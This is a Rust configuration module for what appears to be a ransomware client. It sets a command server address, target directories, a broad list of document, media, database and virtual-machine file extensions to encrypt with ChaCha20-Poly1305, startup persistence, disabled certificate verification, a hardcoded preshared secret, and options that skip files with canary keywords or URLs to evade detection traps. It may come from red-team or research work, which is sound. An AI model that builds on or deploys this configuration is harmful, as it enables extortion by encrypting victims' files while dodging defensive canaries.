use std::{path::PathBuf, sync::LazyLock};

/// Remote server port [required]
pub const SERVER_PORT: u16 = 3000;

/// Remote server IP address or hostname [required]
pub static SERVER_FQDN: LazyLock<String> = LazyLock::new(|| lc!("127.0.0.1"));

/// Filesystem paths to target [required]
pub static ALLOWLIST_PATHS: LazyLock<Vec<PathBuf>> = LazyLock::new(|| {
    vec![
        PathBuf::from("C:\\Users\\jenki\\Downloads\\Dir1"),
        PathBuf::from("C:\\Users\\jenki\\Downloads\\Dir2"),
    ]
});

/// Filesystem paths to avoid [optional]
pub static BLOCKLIST_PATHS: LazyLock<Option<Vec<PathBuf>>> = LazyLock::new(|| None);

/// File extensions to target
pub static ALLOWLIST_EXTENSIONS: LazyLock<Vec<String>> = LazyLock::new(|| {
    [
        "jar", "xps", "pub", "eml", "htm", "aif", "ai", "dwg", "sqlite", "db", "accdb", "mdb",
        "stl", "obj", "fbx", "3ds", "ply", "mpg", "mpeg", "webm", "mkv", "vsdm", "vsd", "vsdx",
        "mp4", "mp3", "vmdk", "ova", "ovf", "vmx", "qcow", "iso", "gif", "aac", "pl", "7z", "rar",
        "m4a", "wma", "avi", "wmv", "d3dbsp", "sc2save", "sie", "sum", "bkp", "flv", "js", "raw",
        "jpeg", "tar", "zip", "gz", "cmd", "key", "dot", "docm", "txt", "doc", "docx", "xls",
        "xlsx", "ppt", "pptx", "odt", "jpg", "png", "csv", "sql", "sln", "php", "asp", "aspx",
        "html", "xml", "psd", "bmp", "pdf", "py", "rtf", "heic", "webp", "mov",
    ]
    .iter()
    .map(ToString::to_string)
    .collect()
});

/// File extensions to avoid [optional]
pub static BLOCKLIST_EXTENSIONS: LazyLock<Option<Vec<String>>> = LazyLock::new(|| None);

/// Extension used for encrypted files [required]
pub static ENCRYPTED_EXTENSION: LazyLock<String> = LazyLock::new(|| lc!("chacha20poly1305"));

/// Whether to save RSA public key to disk [required]
pub const SAVE_PUBLIC_KEY_TO_DISK: bool = true;

/// Whether to set wallpaper to the application icon [required]
pub const SET_WALLPAPER: bool = false;

/// Whether the client should use HTTP or HTTPS [required]
pub const HTTPS: bool = true;

/// Whether the client should verify the web certificate [required]
pub const VERIFY_SERVER: bool = false;

/// Whether files should be encrypted or only logged for analysis [required]
pub const ANALYZE_MODE: bool = false;

/// Whether the client should add a startup entry [required]
pub const PERSIST: bool = true;

/// Whether to avoid hidden files and directories [required]
pub const AVOID_HIDDEN: bool = false;

/// Whether to avoid files containing URLs [required]
pub const AVOID_URLS: bool = true;

/// Whether to avoid files containing canary keywords [required]
pub const AVOID_KEYWORDS: bool = true;

/// Whether to avoid broken image files [required]
pub const AVOID_BROKEN_IMAGES: bool = false;

/// Whether to analyze office/zip files for avoidance [required]
pub const ANALYZE_OFFICE_ZIP: bool = false;

/// Whether to analyze PDF files for avoidance [required]
pub const ANALYZE_PDF: bool = false;

/// Whether to encrypt files in random order [required]
pub const RANDOM_ORDER: bool = false;

/// Wait time between encrypting files in seconds [required]
pub const WAIT_TIME: u32 = 0;

/// Jitter time applied to wait time in seconds [required]
pub const JITTER_TIME: u32 = 0;

/// Maximum file size in bytes to encrypt in a single in-memory AEAD operation [required]
pub const MAX_ENCRYPT_FILE_BYTES: u64 = 256 * 1024 * 1024;

/// Secret used to validate web requests [required]
pub static PRESHARED_SECRET: LazyLock<String> =
    LazyLock::new(|| lc!("gEFPsWMHEjdbBccgFKAFwdYwD98mH6cn7mmVwVgS8Vq4EUNocCwh3wLHrEVA7RzS"));
